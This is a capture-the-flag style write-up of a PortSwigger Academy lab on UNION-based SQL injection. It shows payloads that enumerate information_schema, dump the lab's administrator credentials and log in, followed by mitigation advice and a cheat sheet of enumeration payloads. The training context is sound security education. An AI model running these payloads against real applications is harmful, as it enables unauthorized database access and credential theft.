# SQL Injection UNION Attack - Listing Database Contents (information_schema)

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Determine what tables and columns exist in the database using `information_schema`, then extract usernames and passwords from the discovered users table to log in as administrator.

---

## Vulnerability

The application is vulnerable to UNION-based SQL injection in the product category filter. The database user has access to `information_schema` — a built-in metadata database that acts as a directory of all tables, columns, and database structures.

**Backend Query Structure:**
```sql
SELECT col1, col2 FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** allowing SQL injection
- **Excessive database privileges** — application user can query `information_schema`
- **No output filtering** — metadata is displayed directly on the page
- **Randomized table/column names** — appears to be "security through obscurity" but fails against `information_schema` enumeration

This lab demonstrates why **obfuscating table/column names doesn't stop SQL injection** — if the attacker can query metadata tables, everything is revealed.

---

## Understanding information_schema

### What is information_schema?

`information_schema` is a **built-in read-only database** available in MySQL, PostgreSQL, and MSSQL. It's essentially a **map of the entire database** containing:

| Table | What It Contains |
|-------|------------------|
| `information_schema.tables` | All table names in the database |
| `information_schema.columns` | All column names + which table they belong to |
| `information_schema.schemata` | All database names on the server |

**Key Insight:** Even if developers randomize table/column names (like `users_hpnhqd` instead of `users`), `information_schema` reveals everything.

---

## My Attack Methodology

### 🔵 Step 1: Find Number of Columns

**Payload:**
```sql
' UNION SELECT NULL,NULL--
```

**Why this step:**
- Before UNION works, I need to match the column count
- Incrementing NULLs until success reveals the structure

**Result:** ✅ 2 columns confirmed

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT NULL, NULL--'
```

---

### 🔵 Step 2: Identify Text Columns

**Payload:**
```sql
' UNION SELECT 'a','b'--
```

**Why this step:**
- Need to know which columns can display string data
- Both columns must accept text to extract table/column names

**Result:** ✅ Both columns accept and display text

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT 'a', 'b'--'
```

---

### 🔵 Step 3: Enumerate Table Names

**Payload:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Why this step:**
- I don't know what tables exist in the database
- `information_schema.tables` lists every table
- Looking for a table containing user credentials

**Result:** Found target table: `users_hpnhqd` 🎯

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT table_name, NULL FROM information_schema.tables--'
```

**What I saw on the page:**
```
products
users_hpnhqd    ← Target found!
sessions
...
```

---

### 🔵 Step 4: Enumerate Column Names

**Payload:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_hpnhqd'--
```

**Why this step:**
- I know the table name but not the column names
- `information_schema.columns` lists all columns
- Filtering by `table_name='users_hpnhqd'` narrows results to just that table

**Result:** Found columns: `username_rcigjf` and `password_ormhof` 🎯

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT column_name, NULL FROM information_schema.columns
WHERE table_name='users_hpnhqd'--'
```

**What I saw on the page:**
```
username_rcigjf
password_ormhof
```

---

### 🔵 Step 5: Extract the Credentials

**Payload:**
```sql
' UNION SELECT username_rcigjf,password_ormhof FROM users_hpnhqd--
```

**Why this step:**
- I have everything: table name (`users_hpnhqd`) and column names
- Time to dump the actual credential data

**Result:** 💥 Credentials dumped!

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT username_rcigjf, password_ormhof FROM users_hpnhqd--'
```

**Extracted Data:**
```
administrator : qqd19t941hljmw0yl3ot
```

---

### 🔵 Step 6: Log In as Administrator

**Action:**
- Used extracted credentials to log in
- Username: `administrator`
- Password: `qqd19t941hljmw0yl3ot`

**Result:** ✅ Lab solved!

---

## Complete Attack Flow Visualization

```
Step 1: ' UNION SELECT NULL,NULL--
        ↓
        ✅ 2 columns exist

Step 2: ' UNION SELECT 'a','b'--
        ↓
        ✅ Both columns are text

Step 3: ' UNION SELECT table_name,NULL FROM information_schema.tables--
        ↓
        ✅ Found table: users_hpnhqd

Step 4: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_hpnhqd'--
        ↓
        ✅ Found columns: username_rcigjf, password_ormhof

Step 5: ' UNION SELECT username_rcigjf,password_ormhof FROM users_hpnhqd--
        ↓
        💥 Credentials dumped: administrator:qqd19t941hljmw0yl3ot

Step 6: Log in with extracted credentials
        ↓
        🎯 Lab solved!
```

---

## What I Learned

1. **information_schema is a complete database map** — nothing can hide from it
2. **Randomized names don't stop SQLi** — "security through obscurity" fails
3. **Methodical enumeration is key** — columns → tables → column names → data
4. **Each step builds on the previous** — structured approach prevents mistakes

---

## Why Randomized Names Failed

The developers tried to hide the users table by naming it `users_hpnhqd` instead of just `users`. They also randomized column names (`username_rcigjf` instead of `username`).

**This does NOT prevent SQL injection because:**

```sql
-- ❌ Developer thinks this is secure:
"If we name it users_hpnhqd, they'll never guess it!"

-- ✅ Attacker doesn't guess, they enumerate:
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- 💥 Result: All table names revealed, including users_hpnhqd
```

**Security through obscurity is not security.**

---

## Real-World Impact

This attack pattern enables:
- **Credential theft** — usernames and passwords dumped
- **Data exfiltration** — any table can be extracted
- **Privilege escalation** — gaining admin access

**Historical Examples:**
- E-commerce sites with "hidden" admin tables discovered via `information_schema`
- Healthcare databases with obfuscated patient tables fully enumerated

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) — the primary defense
- Apply **principle of least privilege** — revoke `information_schema` access
- **Never rely on name obfuscation** — it's not a security control
- Use **database views** with restricted columns instead of direct table access

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```

---

## information_schema Cheat Sheet

### MySQL/PostgreSQL Enumeration:

**List all databases:**
```sql
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
```

**List all tables:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**List all tables in a specific database:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='database_name'--
```

**List columns for a specific table:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**List columns with their data types:**
```sql
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--
```

